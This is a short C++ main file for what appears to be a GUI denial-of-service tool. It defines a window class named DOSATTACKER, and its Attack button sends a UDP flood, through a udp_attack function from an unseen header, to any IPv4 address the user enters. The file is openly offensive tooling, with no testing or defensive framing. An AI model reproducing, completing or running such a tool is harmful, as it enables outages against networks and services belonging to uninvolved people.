#include <iostream>
#include "GUI.h"
#include "udp.h"


int main() {
    DOSATTACKER app(0);
    app.show();

    app.Attack.events().click([&app]{

        auto IP = app.textbox1.text();

        if(isIPv4(IP)){
            udp_attack(IP);
        }

        app.textbox1.select(true);
        app.textbox1.del();

    });
    nana::exec();
}
